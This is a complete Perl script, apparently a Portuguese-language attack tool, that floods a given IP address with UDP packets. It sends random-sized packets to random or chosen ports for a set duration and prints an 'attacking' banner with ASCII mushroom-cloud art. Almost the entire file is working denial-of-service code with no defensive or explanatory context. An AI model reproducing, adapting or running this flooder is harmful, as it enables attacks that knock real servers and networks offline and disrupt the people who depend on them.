#!/usr/bin/perl
#Codada by sqaryy
 
use Socket;
use strict;
 
print '
';
print "\n";
 
 
if ($#ARGV != 3) {
  print "perl nowy.pl 66.66.66.66 0 65500 0";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Cannot connect to $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
print "~ Atacando o ip $ip com a porta $port durante $time segundos ~";
print " 
------------------------------------------------------- 
          _ ._  _ , _ ._
        (_ ' ( `  )_  .__)
      ( (  (    )   `)  ) _)
     (__ (_   (_ . _) _) ,__)
         `~~`\ ' . /`~~`
              ;   ;
              /   \
_____________/_ __ \_____________
------------------------------------------------------- 
 ";
 
print "Para parar o ataque Cntrl+C/Z";
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(15000-64)+64) ;
  $pport = $port ? $port : int(rand(99999))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}